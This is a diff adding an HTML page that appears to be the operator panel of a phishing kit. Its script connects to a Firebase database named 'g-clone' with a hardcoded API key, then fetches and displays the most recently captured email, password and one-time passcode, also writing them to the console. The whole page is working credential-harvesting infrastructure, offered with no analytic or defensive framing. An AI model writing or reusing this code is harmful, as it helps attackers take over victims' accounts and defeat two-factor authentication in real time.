@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retrieve Recent Credentials and OTP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333333;
+        }
+        p {
+            font-size: 16px;
+            color: #555555;
+            margin: 10px 0;
+        }
+        #email, #password, #otpValue {
+            font-weight: bold;
+            color: #333333;
+        }
+        #newEntrySection {
+            margin-top: 20px;
+        }
+    </style>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+        import { getDatabase, ref, get, query, orderByChild, limitToLast } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzJSKTgfUFKZ3GLFP5rIprrNkY77lq7FA",
+            authDomain: "g-clone-f53db.firebaseapp.com",
+            databaseURL: "https://g-clone-f53db-default-rtdb.firebaseio.com",
+            projectId: "g-clone-f53db",
+            storageBucket: "g-clone-f53db.appspot.com",
+            messagingSenderId: "567090264097",
+            appId: "1:567090264097:web:31d4e3c99fcba6dc624b60",
+            measurementId: "G-YBG1228CM5"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        function displayRecentCredentials() {
+            const passwordsRef = ref(database, 'Passwords/');
+            const recentPasswordQuery = query(passwordsRef, orderByChild('timestamp'), limitToLast(1));
+
+            get(recentPasswordQuery).then((snapshot) => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const lastPasswordKey = Object.keys(data)[0];
+                    const lastPasswordData = data[lastPasswordKey];
+
+                    const emailElement = document.getElementById("email");
+                    const passwordElement = document.getElementById("password");
+
+                    if (emailElement && passwordElement) {
+                        emailElement.textContent = `Email: ${lastPasswordData.email}`;
+                        passwordElement.textContent = `Password: ${lastPasswordData.password}`;
+                        console.log("Displayed recent email:", lastPasswordData.email);
+                        console.log("Displayed recent password:", lastPasswordData.password);
+                    } else {
+                        console.error("emailElement or passwordElement not found");
+                    }
+                } else {
+                    console.log("No passwords found.");
+                }
+            }).catch((error) => {
+                console.error("Error retrieving recent password: ", error);
+            });
+        }
+
+        function displayRecentOTP() {
+            const otpsRef = ref(database, 'OTPs/');
+            const recentOtpQuery = query(otpsRef, orderByChild('timestamp'), limitToLast(1));
+
+            get(recentOtpQuery).then((snapshot) => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const lastOtpKey = Object.keys(data)[0];
+                    const lastOtpData = data[lastOtpKey];
+
+                    const otpElement = document.getElementById("otpValue");
+
+                    if (otpElement) {
+                        otpElement.textContent = `OTP: ${lastOtpData.value}`;
+                        console.log("Displayed recent OTP:", lastOtpData.value);
+                    } else {
+                        console.error("otpElement not found");
+                    }
+                } else {
+                    console.log("No OTPs found.");
+                }
+            }).catch((error) => {
+                console.error("Error retrieving recent OTP: ", error);
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            console.log("Document loaded and script running.");
+            displayRecentCredentials();
+            displayRecentOTP();
+        });
+    </script>
+</head>
+<body>
+  <div class="container">
+      <h1>Recent Credentials and OTP</h1>
+      <p id="email">Email: Loading...</p>
+      <p id="password">Password: Loading...</p>
+      <p id="otpValue">OTP: Loading...</p>
+  </div>
+</body>
+</html>
